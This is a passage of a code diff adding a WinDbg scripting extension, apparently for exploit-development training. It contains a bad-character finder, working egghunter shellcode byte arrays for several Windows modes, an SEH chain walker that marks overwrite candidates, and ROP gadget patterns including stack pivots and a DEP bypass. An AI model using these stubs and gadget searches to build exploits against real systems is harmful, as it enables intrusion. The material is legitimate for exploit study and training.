+          info(`Matched ${located.matchedRun} survivor bytes at anchor + 0x${located.offset.toString(16).toUpperCase()} (expected index ${located.expectedStart}).`);
+        } else {
+          const afterSlot = readAfterReturnSlot(anchor, pointerSize, expected.length + 64);
+          if (!afterSlot) {
+            warn(`Test array not found within ${windowBytes} bytes of the anchor (min run ${minRun}).`);
+            warn("The overwritten return address was not found just before the anchor either. If the array sits before EIP, pass its address.");
+            return result("badchar_find", options, [{ located: false }], warnings.length > 0 ? warnings : ["Test array not found near anchor."]);
+          }
+          landing2 = afterSlot.landing;
+          observed = afterSlot.observed;
+          locatedBy = "return-slot";
+          info(`No survivor run near the anchor. Comparing from ${formatAddress(landing2, pointerSize)}, right after the overwritten return address at ${formatAddress(afterSlot.slot, pointerSize)}.`);
+        }
+        const compared = compareBadchars(observed, expected, slack);
+        if (locatedBy === "content") {
+          landing2 += __bi(compared.startOffset);
+          info(`Located at ${formatAddress(landing2, pointerSize)}.`);
+        }
+        if (compared.badChars.length > 0) {
+          warn(`Bad characters found: ${compared.badChars.map((v) => formatHexByte(v)).join(" ")}`);
+        } else if (compared.expectedConsumed >= expected.length) {
+          info("All expected bytes survived \u2014 no bad characters detected.");
+        } else {
+          info("No bad characters detected in the tested range.");
+        }
+        info(`Survivors: ${compared.survivorCount} of ${compared.expectedConsumed} tested bytes`);
+        if (compared.expectedConsumed < expected.length) {
+          const lastTested = expected[compared.expectedConsumed - 1];
+          const firstUntested = expected[compared.expectedConsumed];
+          warn(`Array truncated after ${formatHexByte(lastTested)}; bytes ${formatHexByte(firstUntested)}-0xFF not tested.`);
+          if (compared.truncatedAt !== void 0) {
+            warn(`Likely terminator: ${formatHexByte(compared.truncatedAt)} (first byte that never arrived).`);
+          }
+          if (compared.survivorCount === 0) {
+            warn("Nothing arrived after the return address. If the next run stops at the next byte again, the target caps the input length; move the array before EIP.");
+          }
+        }
+        const allExclude = [.../* @__PURE__ */ new Set([...normalizedExclude.values, ...compared.badChars])].sort((a, b) => a - b);
+        info(`Copy-ready exclude list: ${allExclude.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join(" ") || "(none)"}`);
+        const nextRun = compared.truncatedAt === void 0 ? allExclude : [...allExclude, compared.truncatedAt].sort((a, b) => a - b);
+        info(`Exploit line: ${pythonBadcharsLine(nextRun)}`);
+        info(`Next command: ${nextBadcharCommand("badchar_find", options.address === void 0 ? "@esp" : formatAddress(anchor, pointerSize), nextRun)}`);
+        return result("badchar_find", __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }), [
+          {
+            located: true,
+            locatedBy,
+            landingAddress: landing2,
+            anchorOffset: located == null ? void 0 : located.offset,
+            expectedStart: located == null ? void 0 : located.expectedStart,
+            matchedRun: located == null ? void 0 : located.matchedRun,
+            badChars: compared.badChars,
+            survivorCount: compared.survivorCount,
+            expectedConsumed: compared.expectedConsumed,
+            mismatches: compared.mismatches,
+            truncatedAt: compared.truncatedAt,
+            allExclude,
+            exclude: normalizedExclude.values
+          }
+        ], warnings);
+      }
+    };
+  }
+
+  // src/commands/egghunter.ts
+  var SYSCALL_TABLE = {
+    win7: 2,
+    win10: 457
+  };
+  var NTACCESS_X86 = [
+    102,
+    129,
+    202,
+    255,
+    15,
+    // or dx, 0x0fff
+    66,
+    // inc edx
+    82,
+    // push edx
+    184,
+    201,
+    1,
+    0,
+    0,
+    // mov eax, 0x1C9
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    90,
+    // pop edx
+    116,
+    237,
+    // je short (back to or dx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    250,
+    // mov edi, edx
+    175,
+    // scasd
+    117,
+    232,
+    // jne short (back to inc edx)
+    175,
+    // scasd
+    117,
+    229,
+    // jne short (back to inc edx)
+    255,
+    231
+    // jmp edi
+  ];
+  var NTACCESS_WOW64 = [
+    102,
+    129,
+    201,
+    255,
+    15,
+    // or cx, 0x0fff
+    65,
+    // inc ecx
+    81,
+    // push ecx
+    184,
+    201,
+    1,
+    0,
+    0,
+    // mov eax, 0x1C9
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    89,
+    // pop ecx
+    116,
+    237,
+    // je short (back to or cx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    249,
+    // mov edi, ecx
+    175,
+    // scasd
+    117,
+    232,
+    // jne short (back to inc ecx)
+    175,
+    // scasd
+    117,
+    229,
+    // jne short (back to inc ecx)
+    255,
+    231
+    // jmp edi
+  ];
+  var NTDISPLAY_X86 = [
+    102,
+    129,
+    202,
+    255,
+    15,
+    // or dx, 0x0fff
+    66,
+    // inc edx
+    82,
+    // push edx
+    106,
+    67,
+    // push 0x43  (NtDisplayString syscall)
+    88,
+    // pop eax
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    90,
+    // pop edx
+    116,
+    239,
+    // je short (back to or dx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    250,
+    // mov edi, edx
+    175,
+    // scasd
+    117,
+    234,
+    // jne short (back to inc edx)
+    175,
+    // scasd
+    117,
+    231,
+    // jne short (back to inc edx)
+    255,
+    231
+    // jmp edi
+  ];
+  var NTDISPLAY_WOW64 = [
+    102,
+    129,
+    201,
+    255,
+    15,
+    // or cx, 0x0fff
+    65,
+    // inc ecx
+    81,
+    // push ecx
+    106,
+    67,
+    // push 0x43  (NtDisplayString syscall)
+    88,
+    // pop eax
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    89,
+    // pop ecx
+    116,
+    239,
+    // je short (back to or cx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    249,
+    // mov edi, ecx
+    175,
+    // scasd
+    117,
+    234,
+    // jne short (back to inc ecx)
+    175,
+    // scasd
+    117,
+    231,
+    // jne short (back to inc ecx)
+    255,
+    231
+    // jmp edi
+  ];
+  var TAG_OFFSET_NTDISPLAY = 18;
+  var TAG_OFFSET_NTDISPLAY_WOW64 = 18;
+  var SYSCALL_OFFSET_NTDISPLAY = 8;
+  var SYSCALL_OFFSET_NTDISPLAY_WOW64 = 8;
+  var NTDISPLAY_SYSCALL = {
+    win7: 67,
+    win10: 67
+  };
+  var SEH_EGGHUNTER = [
+    // jmp short install_seh
+    235,
+    23,
+    // handler (offset 0x02, 23 bytes)
+    139,
+    76,
+    36,
+    12,
+    // mov ecx, [esp+0x0C]      (ContextRecord)
+    139,
+    68,
+    36,
+    8,
+    // mov eax, [esp+0x08]      (EstablisherFrame)
+    139,
+    64,
+    4,
+    // mov eax, [eax+0x04]      (handler address)
+    131,
+    192,
+    43,
+    // add eax, 0x2B            (scan_loop = handler+43)
+    137,
+    129,
+    184,
+    0,
+    0,
+    0,
+    // mov [ecx+0xB8], eax     (set Eip = scan_loop)
+    49,
+    192,
+    // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
+    195,
+    // ret
+    // install_seh (offset 0x19)
+    49,
+    210,
+    // xor edx, edx
+    232,
+    0,
+    0,
+    0,
+    0,
+    // call $+5
+    94,
+    // pop esi                  (esi = addr of this pop)
+    131,
+    238,
+    30,
+    // sub esi, 0x1E            (esi = handler addr)
+    86,
+    // push esi                 (handler)
+    100,
+    255,
+    50,
+    // push dword ptr fs:[edx]  (old SEH)
+    100,
+    137,
+    34,
+    // mov dword ptr fs:[edx], esp
+    49,
+    255,
+    // xor edi, edi             (scan from 0)
+    // scan_loop (offset 0x2D) — handler resumes here (next page)
+    102,
+    129,
+    207,
+    255,
+    15,
+    // or di, 0x0FFF
+    // next_addr (offset 0x32) — jnz resumes here (next dword)
+    71,
+    // inc edi
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>           (tag at offset 0x34)
+    175,
+    // scasd
+    117,
+    247,
+    // jnz next_addr            (0x32)
+    175,
+    // scasd
+    117,
+    244,
+    // jnz next_addr            (0x32)
+    // found — restore old SEH and jump
+    100,
+    143,
+    2,
+    // pop dword ptr fs:[edx]
+    131,
+    196,
+    4,
+    // add esp, 0x04
+    255,
+    231
+    // jmp edi
+  ];
+  var TAG_OFFSET_NTACCESS = 20;
+  var TAG_OFFSET_NTACCESS_WOW64 = 20;
+  var TAG_OFFSET_SEH = 52;
+  var SYSCALL_OFFSET_NTACCESS = 8;
+  var SYSCALL_OFFSET_NTACCESS_WOW64 = 8;
+  function uniqueBytes(values) {
+    const seen = /* @__PURE__ */ new Set();
+    for (const v of values != null ? values : []) {
+      if (Number.isInteger(v) && v >= 0 && v <= 255)
+        seen.add(v & 255);
+    }
+    return [...seen].sort((a, b) => a - b);
+  }
+  function checkBadchars(bytes, label, badSet) {
+    const hits = [];
+    for (let i = 0; i < bytes.length; i++) {
+      if (badSet.has(bytes[i])) {
+        hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
+      }
+    }
+    return hits;
+  }
+  function tagBytes(tag) {
+    return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
+  }
+  function dwordLE(val) {
+    return [val & 255, val >> 8 & 255, val >> 16 & 255, val >> 24 & 255];
+  }
+  function buildEgghunter(options) {
+    var _a;
+    const tag = tagBytes(options.tag);
+    const badSet = new Set(uniqueBytes(options.badchars));
+    let template;
+    let tagOffset;
+    let syscallOffset = null;
+    let label;
+    let syscallSize = 4;
+    if (options.mode === "seh") {
+      template = [...SEH_EGGHUNTER];
+      tagOffset = TAG_OFFSET_SEH;
+      label = "seh egghunter";
+    } else if (options.mode === "ntdisplay") {
+      if (options.wow64) {
+        template = [...NTDISPLAY_WOW64];
+        tagOffset = TAG_OFFSET_NTDISPLAY_WOW64;
+        syscallOffset = SYSCALL_OFFSET_NTDISPLAY_WOW64;
+        label = "ntdisplay wow64 egghunter";
+      } else {
+        template = [...NTDISPLAY_X86];
+        tagOffset = TAG_OFFSET_NTDISPLAY;
+        syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
+        label = "ntdisplay egghunter";
+      }
+      syscallSize = 1;
+    } else if (options.wow64) {
+      template = [...NTACCESS_WOW64];
+      tagOffset = TAG_OFFSET_NTACCESS_WOW64;
+      syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
+      label = "ntaccess wow64 egghunter";
+    } else {
+      template = [...NTACCESS_X86];
+      tagOffset = TAG_OFFSET_NTACCESS;
+      syscallOffset = SYSCALL_OFFSET_NTACCESS;
+      label = "ntaccess egghunter";
+    }
+    template.splice(tagOffset, 4, ...tag);
+    let syscallUsed = null;
+    if (syscallOffset !== null) {
+      const defaultSyscall = options.mode === "ntdisplay" ? NTDISPLAY_SYSCALL[options.os] : SYSCALL_TABLE[options.os];
+      const sysnum = (_a = options.syscall) != null ? _a : defaultSyscall;
+      if (syscallSize === 1) {
+        if (sysnum < 1 || sysnum > 127) {
+        }
+        template.splice(syscallOffset, 1, sysnum & 255);
+      } else {
+        template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+      }
+      syscallUsed = sysnum;
+    }
+    const badcharHits3 = checkBadchars(template, label, badSet);
+    return { bytes: template, size: template.length, badcharHits: badcharHits3, syscallUsed };
+  }
+  function bytesToHex(bytes) {
+    return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
+  }
+  function bytesToPython(bytes) {
+    return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
+  }
+  function createEgghunterCommand() {
+    return {
+      name: "egghunter",
+      description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
+      usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)",
+      examples: [
+        'dx @$osed().egghunter("W00T")',
+        'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win7")',
+        'dx @$osed().egghunter("W00T", "ntdisplay")',
+        'dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D")',
+        'dx @$osed().egghunter("B33F", "seh")',
+        'dx @$osed().egghunter("W00T", "ntaccess", true)',
+        'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
+        'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win10", 0x1c9)'
+      ],
+      schema: {
+        tag: { type: "string", default: "W00T" },
+        mode: { type: "string", enum: ["ntaccess", "ntdisplay", "seh"], default: "ntaccess" },
+        wow64: { type: "boolean", default: false },
+        badchars: { type: "array", default: [] },
+        os: { type: "string", enum: ["win7", "win10"], default: "win10" },
+        syscall: { type: "number", default: null }
+      },
+      execute(options) {
+        var _a, _b, _c, _d, _e, _f;
+        const opts = {
+          tag: (_a = options.tag) != null ? _a : "W00T",
+          mode: (_b = options.mode) != null ? _b : "ntaccess",
+          wow64: (_c = options.wow64) != null ? _c : false,
+          badchars: (_d = options.badchars) != null ? _d : [],
+          os: (_e = options.os) != null ? _e : "win10",
+          syscall: (_f = options.syscall) != null ? _f : null
+        };
+        const result3 = buildEgghunter(opts);
+        section("Egghunter");
+        const sysLabel = result3.syscallUsed !== null ? ` | Syscall: 0x${result3.syscallUsed.toString(16).toUpperCase()} (${opts.os})` : "";
+        info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result3.size} bytes${sysLabel}`);
+        print(bytesToHex(result3.bytes));
+        print(bytesToPython(result3.bytes));
+        if (result3.badcharHits.length > 0) {
+          for (const hit of result3.badcharHits) {
+            warn(`Badchar: ${hit}`);
+          }
+        }
+        return {
+          command: "egghunter",
+          args: options,
+          success: result3.badcharHits.length === 0,
+          findings: [result3],
+          warnings: result3.badcharHits,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/seh.ts
+  function shortModuleName(name) {
+    var _a;
+    return (_a = name.replace(/\//g, "\\").split("\\").pop()) != null ? _a : name;
+  }
+  function formatEspDelta(node, esp) {
+    if (esp === void 0)
+      return "unknown";
+    const delta = node - esp;
+    const sign = delta < __bi(0) ? "-" : "+";
+    const magnitude = delta < __bi(0) ? -delta : delta;
+    return `${sign}0x${magnitude.toString(16).toUpperCase()}`;
+  }
+  function triStateFlag(value) {
+    return value === null ? "unknown" : value ? "yes" : "no";
+  }
+  function createSehCommand() {
+    return {
+      name: "seh",
+      description: "Walk current thread SEH chain.",
+      usage: "dx @$osed().seh.visualize()",
+      examples: ["dx @$osed().seh.visualize()"],
+      schema: {},
+      execute(options) {
+        var _a, _b;
+        const pointerSize = getPointerSize();
+        if (pointerSize !== 4) {
+          return {
+            command: "seh",
+            args: options,
+            success: false,
+            findings: [],
+            warnings: ["SEH chain walking is x86-focused in v1."],
+            errors: ["Current pointer size is not x86."]
+          };
+        }
+        const teb = resolveTeb32Address(host.currentThread);
+        if (teb === void 0) {
+          throw new Error("Current thread TEB is unavailable.");
+        }
+        const rows = [];
+        const findings = [];
+        const walk = walkSehRecords(teb);
+        const records = walk.records;
+        const esp = readRegisters(4).sp;
+        for (const [depth, { node, next, handler }] of records.entries()) {
+          const module = findModuleByAddress(handler);
+          const executable = memoryRegion(handler).executable;
+          const brokenNext = depth === records.length - 1 && walk.warning !== void 0;
+          const end = next === __bi(4294967295);
+          const integrity = brokenNext ? "BROKEN NEXT" : !module || executable === false ? "BAD HANDLER" : end ? "END" : "OK";
+          const candidate = Boolean(module && executable === true && module.safeseh === "disabled" && module.aslr === "disabled");
+          const assessment = candidate ? "CANDIDATE" : !module || executable === false ? "INVALID" : module.safeseh === "enabled" ? "PROTECTED" : module.aslr === "enabled" ? "ASLR" : "REVIEW";
+          const moduleName = module ? shortModuleName(module.name) : "<unmapped>";
+          const target = module ? `${moduleName}+0x${(handler - module.base).toString(16).toUpperCase()}` : "<unmapped>";
+          rows.push({
+            depth: `${depth}`,
+            node: formatAddress(node, 4),
+            next: end ? "END" : formatAddress(next, 4),
+            handler: formatAddress(handler, 4),
+            target,
+            safeseh: module ? module.safeseh : "unknown",
+            aslr: module ? module.aslr : "unknown",
+            executable: triStateFlag(executable),
+            espDelta: formatEspDelta(node, esp),
+            integrity,
+            assessment
+          });
+          findings.push({
+            depth,
+            node,
+            next,
+            handler,
+            module: moduleName,
+            moduleOffset: module ? handler - module.base : void 0,
+            espDelta: esp === void 0 ? void 0 : node - esp,
+            executable,
+            aslr: (_a = module == null ? void 0 : module.aslr) != null ? _a : "unknown",
+            safeSeh: (_b = module == null ? void 0 : module.safeseh) != null ? _b : "unknown",
+            end,
+            brokenNext,
+            integrity,
+            candidate,
+            assessment
+          });
+        }
+        section("SEH Chain");
+        table([
+          { key: "depth", header: "#", width: 2 },
+          { key: "node", header: "Node", width: 10 },
+          { key: "next", header: "Next", width: 10 },
+          { key: "handler", header: "Handler", width: 10 },
+          { key: "target", header: "Module+Offset", width: 24 },
+          { key: "safeseh", header: "SafeSEH", width: 8 },
+          { key: "aslr", header: "ASLR", width: 8 },
+          { key: "executable", header: "Exec", width: 7 },
+          { key: "espDelta", header: "ESP Delta", width: 10 },
+          { key: "integrity", header: "Integrity", width: 11 },
+          { key: "assessment", header: "Assessment", width: 10 }
+        ], rows);
+        if (walk.warning) {
+          warn(walk.warning);
+        }
+        if (walk.stoppedAtGuard) {
+          warn("SEH walk stopped at guard limit (64 entries).");
+        }
+        whyItMatters("The chain identifies overwritten frames, ESP-relative offsets, and handlers protected by SafeSEH or ASLR.");
+        return {
+          command: "seh",
+          args: options,
+          success: true,
+          findings,
+          warnings: [
+            ...walk.warning ? [walk.warning] : [],
+            ...walk.stoppedAtGuard ? ["SEH walk stopped at guard limit (64 entries)."] : []
+          ],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/logic/instruction_validation.ts
+  var KNOWN_PATTERNS = [
+    // plain ret — useful as a RET-slide dispatcher in PUSHAD DEP-bypass chains
+    { name: "ret", bytes: [195], mnemonic: "ret" },
+    // pop-register ; ret — all 8 general-purpose registers
+    { name: "pop_eax_ret", bytes: [88, 195], mnemonic: "pop eax ; ret" },
+    { name: "pop_ecx_ret", bytes: [89, 195], mnemonic: "pop ecx ; ret" },
+    { name: "pop_edx_ret", bytes: [90, 195], mnemonic: "pop edx ; ret" },
+    { name: "pop_ebx_ret", bytes: [91, 195], mnemonic: "pop ebx ; ret" },
+    { name: "pop_esp_ret", bytes: [92, 195], mnemonic: "pop esp ; ret" },
+    { name: "pop_ebp_ret", bytes: [93, 195], mnemonic: "pop ebp ; ret" },
+    { name: "pop_esi_ret", bytes: [94, 195], mnemonic: "pop esi ; ret" },
+    { name: "pop_edi_ret", bytes: [95, 195], mnemonic: "pop edi ; ret" },
+    // Stack pivots
+    { name: "push_esp_ret", bytes: [84, 195], mnemonic: "push esp ; ret" },
+    { name: "leave_ret", bytes: [201, 195], mnemonic: "leave ; ret" },
+    { name: "xchg_eax_esp_ret", bytes: [148, 195], mnemonic: "xchg eax, esp ; ret" },
+    { name: "xchg_ecx_esp_ret", bytes: [135, 204, 195], mnemonic: "xchg ecx, esp ; ret" },
+    { name: "xchg_edx_esp_ret", bytes: [135, 212, 195], mnemonic: "xchg edx, esp ; ret" },
+    { name: "xchg_ebx_esp_ret", bytes: [135, 220, 195], mnemonic: "xchg ebx, esp ; ret" },
+    { name: "xchg_esi_esp_ret", bytes: [135, 244, 195], mnemonic: "xchg esi, esp ; ret" },
+    { name: "xchg_edi_esp_ret", bytes: [135, 252, 195], mnemonic: "xchg edi, esp ; ret" },
+    { name: "xchg_ebp_esp_ret", bytes: [135, 236, 195], mnemonic: "xchg ebp, esp ; ret" },
+    { name: "mov_esp_ebp_ret", bytes: [139, 229, 195], mnemonic: "mov esp, ebp ; ret" },
+    { name: "mov_esp_eax_ret", bytes: [137, 196, 195], mnemonic: "mov esp, eax ; ret" },
+    // Direct register jumps — primary shellcode dispatch gadgets
+    { name: "jmp_esp", bytes: [255, 228], mnemonic: "jmp esp" },
+    { name: "call_esp", bytes: [255, 212], mnemonic: "call esp" },
+    { name: "jmp_eax", bytes: [255, 224], mnemonic: "jmp eax" },
+    { name: "call_eax", bytes: [255, 208], mnemonic: "call eax" },
+    // inc reg ; ret — one-byte x86 encodings (0x40–0x47)
+    { name: "inc_eax_ret", bytes: [64, 195], mnemonic: "inc eax ; ret" },
+    { name: "inc_ecx_ret", bytes: [65, 195], mnemonic: "inc ecx ; ret" },
+    { name: "inc_edx_ret", bytes: [66, 195], mnemonic: "inc edx ; ret" },
+    { name: "inc_ebx_ret", bytes: [67, 195], mnemonic: "inc ebx ; ret" },
+    { name: "inc_esp_ret", bytes: [68, 195], mnemonic: "inc esp ; ret" },
+    { name: "inc_ebp_ret", bytes: [69, 195], mnemonic: "inc ebp ; ret" },
+    { name: "inc_esi_ret", bytes: [70, 195], mnemonic: "inc esi ; ret" },
+    { name: "inc_edi_ret", bytes: [71, 195], mnemonic: "inc edi ; ret" },
+    // dec reg ; ret — one-byte x86 encodings (0x48–0x4F)
+    { name: "dec_eax_ret", bytes: [72, 195], mnemonic: "dec eax ; ret" },
+    { name: "dec_ecx_ret", bytes: [73, 195], mnemonic: "dec ecx ; ret" },
+    { name: "dec_edx_ret", bytes: [74, 195], mnemonic: "dec edx ; ret" },
+    { name: "dec_ebx_ret", bytes: [75, 195], mnemonic: "dec ebx ; ret" },
+    { name: "dec_esp_ret", bytes: [76, 195], mnemonic: "dec esp ; ret" },
+    { name: "dec_ebp_ret", bytes: [77, 195], mnemonic: "dec ebp ; ret" },
+    { name: "dec_esi_ret", bytes: [78, 195], mnemonic: "dec esi ; ret" },
+    { name: "dec_edi_ret", bytes: [79, 195], mnemonic: "dec edi ; ret" },
+    // neg reg ; ret — opcode F7 /3 (ModRM D8–DF)
+    { name: "neg_eax_ret", bytes: [247, 216, 195], mnemonic: "neg eax ; ret" },
+    { name: "neg_ecx_ret", bytes: [247, 217, 195], mnemonic: "neg ecx ; ret" },
+    { name: "neg_edx_ret", bytes: [247, 218, 195], mnemonic: "neg edx ; ret" },
+    { name: "neg_ebx_ret", bytes: [247, 219, 195], mnemonic: "neg ebx ; ret" },
+    { name: "neg_esp_ret", bytes: [247, 220, 195], mnemonic: "neg esp ; ret" },
+    { name: "neg_ebp_ret", bytes: [247, 221, 195], mnemonic: "neg ebp ; ret" },
+    { name: "neg_esi_ret", bytes: [247, 222, 195], mnemonic: "neg esi ; ret" },
+    { name: "neg_edi_ret", bytes: [247, 223, 195], mnemonic: "neg edi ; ret" },
+    // pushad ; ret — push all 8 GP regs (PUSHAD VirtualProtect DEP bypass technique)
+    { name: "pushad_ret", bytes: [96, 195], mnemonic: "pushad ; ret" }
+  ];
+  var X64_PATTERNS = [
+    { name: "ret", bytes: [195], mnemonic: "ret" },
+    { name: "pop_rax_ret", bytes: [88, 195], mnemonic: "pop rax ; ret" },
+    { name: "pop_rcx_ret", bytes: [89, 195], mnemonic: "pop rcx ; ret" },
+    { name: "pop_rdx_ret", bytes: [90, 195], mnemonic: "pop rdx ; ret" },
+    { name: "pop_rbx_ret", bytes: [91, 195], mnemonic: "pop rbx ; ret" },
+    { name: "pop_rsp_ret", bytes: [92, 195], mnemonic: "pop rsp ; ret" },
+    { name: "pop_rbp_ret", bytes: [93, 195], mnemonic: "pop rbp ; ret" },
+    { name: "pop_rsi_ret", bytes: [94, 195], mnemonic: "pop rsi ; ret" },
+    { name: "pop_rdi_ret", bytes: [95, 195], mnemonic: "pop rdi ; ret" },
+    { name: "pop_r8_ret", bytes: [65, 88, 195], mnemonic: "pop r8 ; ret" },
+    { name: "pop_r9_ret", bytes: [65, 89, 195], mnemonic: "pop r9 ; ret" },
+    { name: "pop_r10_ret", bytes: [65, 90, 195], mnemonic: "pop r10 ; ret" },
+    { name: "pop_r11_ret", bytes: [65, 91, 195], mnemonic: "pop r11 ; ret" },
+    { name: "pop_r12_ret", bytes: [65, 92, 195], mnemonic: "pop r12 ; ret" },
+    { name: "pop_r13_ret", bytes: [65, 93, 195], mnemonic: "pop r13 ; ret" },
+    { name: "pop_r14_ret", bytes: [65, 94, 195], mnemonic: "pop r14 ; ret" },
+    { name: "pop_r15_ret", bytes: [65, 95, 195], mnemonic: "pop r15 ; ret" },
+    { name: "jmp_rsp", bytes: [255, 228], mnemonic: "jmp rsp" },
+    { name: "call_rsp", bytes: [255, 212], mnemonic: "call rsp" },
+    { name: "jmp_rax", bytes: [255, 224], mnemonic: "jmp rax" },
+    { name: "call_rax", bytes: [255, 208], mnemonic: "call rax" },
+    { name: "push_rsp_ret", bytes: [84, 195], mnemonic: "push rsp ; ret" },
+    { name: "leave_ret", bytes: [201, 195], mnemonic: "leave ; ret" },
+    { name: "xchg_rax_rsp_ret", bytes: [72, 148, 195], mnemonic: "xchg rax, rsp ; ret" },
+    { name: "xchg_rcx_rsp_ret", bytes: [72, 135, 204, 195], mnemonic: "xchg rcx, rsp ; ret" },
+    { name: "xchg_rdx_rsp_ret", bytes: [72, 135, 212, 195], mnemonic: "xchg rdx, rsp ; ret" },
+    { name: "xchg_rbx_rsp_ret", bytes: [72, 135, 220, 195], mnemonic: "xchg rbx, rsp ; ret" },
+    { name: "xchg_rbp_rsp_ret", bytes: [72, 135, 236, 195], mnemonic: "xchg rbp, rsp ; ret" },
+    { name: "xchg_rsi_rsp_ret", bytes: [72, 135, 244, 195], mnemonic: "xchg rsi, rsp ; ret" },
+    { name: "xchg_rdi_rsp_ret", bytes: [72, 135, 252, 195], mnemonic: "xchg rdi, rsp ; ret" },
+    { name: "mov_rsp_rbp_ret", bytes: [72, 137, 236, 195], mnemonic: "mov rsp, rbp ; ret" },
+    { name: "mov_rsp_rax_ret", bytes: [72, 137, 196, 195], mnemonic: "mov rsp, rax ; ret" }
+  ];
+  var POP_REGS = [
+    { code: 88, name: "eax" },
+    { code: 89, name: "ecx" },
+    { code: 90, name: "edx" },
+    { code: 91, name: "ebx" },
+    { code: 92, name: "esp" },
+    { code: 93, name: "ebp" },
+    { code: 94, name: "esi" },
+    { code: 95, name: "edi" }
+  ];
+  function buildPprPatterns() {
+    const patterns = [];
+    for (const first of POP_REGS) {
+      for (const second of POP_REGS) {
+        patterns.push({
+          name: `pop_${first.name}_pop_${second.name}_ret`,
+          bytes: [first.code, second.code, 195],
+          mnemonic: `pop ${first.name} ; pop ${second.name} ; ret`
+        });
+      }
+    }
+    return patterns;
+  }
+  function buildWritePatterns() {
+    const dsts = [
+      { rm: 0, name: "eax" },
+      { rm: 1, name: "ecx" },
+      { rm: 2, name: "edx" },
+      { rm: 3, name: "ebx" },
+      { rm: 6, name: "esi" },
+      { rm: 7, name: "edi" }
+    ];
+    const srcs = [
+      { code: 0, name: "eax" },
+      { code: 1, name: "ecx" },
+      { code: 2, name: "edx" },
+      { code: 3, name: "ebx" },
+      { code: 4, name: "esp" },
+      { code: 5, name: "ebp" },
+      { code: 6, name: "esi" },
+      { code: 7, name: "edi" }
+    ];
+    const patterns = [];
+    for (const dst of dsts) {
+      for (const src of srcs) {
+        const modRM = src.code << 3 | dst.rm;
+        patterns.push({
+          name: `mov_mem_${dst.name}_${src.name}_ret`,
+          bytes: [137, modRM, 195],
+          mnemonic: `mov [${dst.name}], ${src.name} ; ret`
+        });
+      }
+    }
+    return patterns;
+  }
+  function buildReadPatterns() {
+    const srcs = [
+      { rm: 0, name: "eax" },
+      { rm: 1, name: "ecx" },
+      { rm: 2, name: "edx" },
+      { rm: 3, name: "ebx" },
+      { rm: 6, name: "esi" },
+      { rm: 7, name: "edi" }
+    ];
+    const dsts = [
+      { code: 0, name: "eax" },
+      { code: 1, name: "ecx" },
+      { code: 2, name: "edx" },
+      { code: 3, name: "ebx" },
+      { code: 4, name: "esp" },
+      { code: 5, name: "ebp" },
+      { code: 6, name: "esi" },
+      { code: 7, name: "edi" }
+    ];
+    const patterns = [];
+    for (const src of srcs) {
+      for (const dst of dsts) {
+        const modRM = dst.code << 3 | src.rm;
+        patterns.push({
+          name: `mov_${dst.name}_mem_${src.name}_ret`,
+          bytes: [139, modRM, 195],
+          mnemonic: `mov ${dst.name}, [${src.name}] ; ret`
+        });
+      }
+    }
+    return patterns;
+  }
+  function buildTransferPatterns() {
+    const regs = [
+      { code: 0, name: "eax" },
+      { code: 1, name: "ecx" },
+      { code: 2, name: "edx" },
+      { code: 3, name: "ebx" },
+      { code: 5, name: "ebp" },
+      { code: 6, name: "esi" },
+      { code: 7, name: "edi" }
+    ];
+    const patterns = [];
+    for (const src of regs) {
+      for (const dst of regs) {
+        if (src.code === dst.code)
+          continue;
+        const modRM = 192 | src.code << 3 | dst.code;
+        patterns.push({
+          name: `mov_${dst.name}_${src.name}_ret`,
+          bytes: [137, modRM, 195],
+          mnemonic: `mov ${dst.name}, ${src.name} ; ret`
+        });
+      }
+    }
+    return patterns;
+  }
+  function buildSwapPatterns() {
+    const regs = [
+      { code: 0, name: "eax" },
+      { code: 1, name: "ecx" },
+      { code: 2, name: "edx" },
+      { code: 3, name: "ebx" },
+      { code: 5, name: "ebp" },
+      { code: 6, name: "esi" },
+      { code: 7, name: "edi" }
+    ];
+    const patterns = [];
+    for (let i = 0; i < regs.length; i++) {
+      for (let j = i + 1; j < regs.length; j++) {
+        const modRM = 192 | regs[i].code << 3 | regs[j].code;
+        patterns.push({
+          name: `xchg_${regs[i].name}_${regs[j].name}_ret`,
+          bytes: [135, modRM, 195],
+          mnemonic: `xchg ${regs[i].name}, ${regs[j].name} ; ret`
+        });
+      }
+    }
+    return patterns;
+  }
+  var ADDITIONAL_PATTERNS = [
+    // call register — remaining GP registers (eax/esp already in KNOWN_PATTERNS)
+    { name: "call_ecx", bytes: [255, 209], mnemonic: "call ecx" },
+    { name: "call_edx", bytes: [255, 210], mnemonic: "call edx" },
